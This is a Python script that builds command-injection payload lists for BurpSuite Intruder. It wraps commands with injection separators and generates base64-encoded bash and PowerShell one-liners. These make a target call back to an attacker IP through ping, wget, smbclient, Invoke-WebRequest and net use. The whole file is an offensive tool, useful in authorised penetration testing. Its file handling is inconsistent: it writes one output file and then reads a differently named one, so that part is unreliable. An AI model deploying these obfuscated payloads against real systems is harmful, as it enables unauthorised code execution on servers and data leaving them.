import sys
import os

# Function to generate manipulated commands
def generate_manipulated_commands(base_command, prefixes, suffixes):
    command_in_parentheses = f"$({base_command})"
    command_variants = [base_command, command_in_parentheses]
    
    generated_commands = []
    
    for variant in command_variants:
        # Add the command itself
        generated_commands.append(f"{variant}")
        for prefix in prefixes:
            # Add the command with prefix
            generated_commands.append(f"{prefix}{variant}")
            
            # Add the command with prefix + all suffixes
            # Also add the command with only suffixes
            for suffix in suffixes:
                generated_commands.append(f"{prefix}{variant}{suffix}")
                generated_commands.append(f"{variant}{suffix}")
    
    return generated_commands


# Function to generate Base64 commands for Linux and Windows
def generate_base64_section(ip_address):
    # Linux commands
    linux_commands = [
        "ping -c 1 <ATTACKER-IP>",
        "wget http://<ATTACKER-IP>/HereWeAre",
        "smbclient //<ATTACKER-IP>/share -N"
    ]
    
    # Windows commands
    windows_commands = [
        'ping -n 1 <ATTACKER-IP>',
        'Invoke-WebRequest -Uri "http://<ATTACKER-IP>/HereWeAre" -OutFile "HereWeAre"',
        'net use \\\\<ATTACKER-IP>\\share'
    ]
    
    base64_section = ["==> BASE64"]
    
    # Generate Linux Base64 commands
    for cmd in linux_commands:
        cmd = cmd.replace("<ATTACKER-IP>", ip_address)
        base64_cmd = f"echo '{cmd}' | base64 -w 0"
        encoded_cmd = os.popen(base64_cmd).read().strip()
        base64_section.append(f"echo '{encoded_cmd}' | base64 -d | bash")
        base64_section.append(f"echo+'{encoded_cmd}'+|+base64+-d+|+bash")
    
    # Generate Windows Base64 commands
    for cmd in windows_commands:
        cmd = cmd.replace("<ATTACKER-IP>", ip_address)
        base64_cmd = f"echo -n '{cmd}' | iconv -t utf-16le | base64 -w 0"
        encoded_cmd = os.popen(base64_cmd).read().strip()
        base64_section.append(f"cmd /c powershell -enc {encoded_cmd}")
        base64_section.append(f"cmd+/c+powershell+-enc+{encoded_cmd}")        
    
    return base64_section


# Main script
if len(sys.argv) < 3:
    print("Usage: python script.py <ATTACKER-IP> <FILE-IN>")
    print("ATTACKER-IP: IP address of the attacker's network interface to receive calls from the target machine")
    print("FILE-IN: input file containing the list of commands")
    print("")
    print("This script generates a list of commands to load into BurpSuite Intruder to test if the parameter identified on the target site")
    print("is vulnerable to the following types of attacks: command injection, LFI, RFI, XSS, SQL injection, SSTI")
    print("")
    sys.exit(1)

# Parse arguments
ip_address = sys.argv[1]
file_in = sys.argv[2]

# Define prefixes and suffixes
#prefixes = [" ", "%00; ", "%0A ", "|| ", "| ", "; ", "& ", "&& ", "%EF%BC%86 ", "%EF%BC%86%EF%BC%86 ", "%EF%BD%9C ", "%EF%BD%9C%EF%BD%9C "]
#suffixes = ["%00 ", "%00; ", "%0A ", "? ", "?%00 ", "; ", "& ", "|| ", "| ", "-- ", "# "]
prefixes = [" "]
suffixes = ["%00 "]

# Process input file
with open(file_in, 'r') as f:
    with open('out-injection-list.txt', 'w') as out:
        for line in f:
            line = line.strip()
            if line.strip() == "" or line.startswith("=="):
                # Skip empty lines or lines starting with "=="
                continue
            if "<ATTACKER-IP>" in line:
                # Replace <ATTACKER-IP> with the actual IP address
                line = line.replace("<ATTACKER-IP>", ip_address)
            
            # Generate commands
            command_list = generate_manipulated_commands(line, prefixes, suffixes)
            for cmd in command_list:
                #print(f"{cmd}")
                out.write(f"{cmd}" + '\n')

# Handle the BASE64 section
output_file = 'out-command-injection-list.txt'

# Read the file and remove the existing BASE64 section if it exists
with open(output_file, 'r') as f:
    lines = f.readlines()

# Remove the BASE64 section if it exists
new_lines = []
base64_section_found = False
for line in lines:
    if line.startswith("==> BASE64"):
        base64_section_found = True
    if not base64_section_found:
        new_lines.append(line)
    if line.strip() == "" and base64_section_found:
        base64_section_found = False

# Write the updated content back to the file
with open(output_file, 'w') as f:
    f.writelines(new_lines)

# Generate the new BASE64 section
base64_section = generate_base64_section(ip_address)

# Append the new BASE64 section to the file
with open(output_file, 'a') as f:
    f.write("\n".join(base64_section) + "\n")

print("Command list generated successfully. Check 'out-command-injection-list.txt'.")
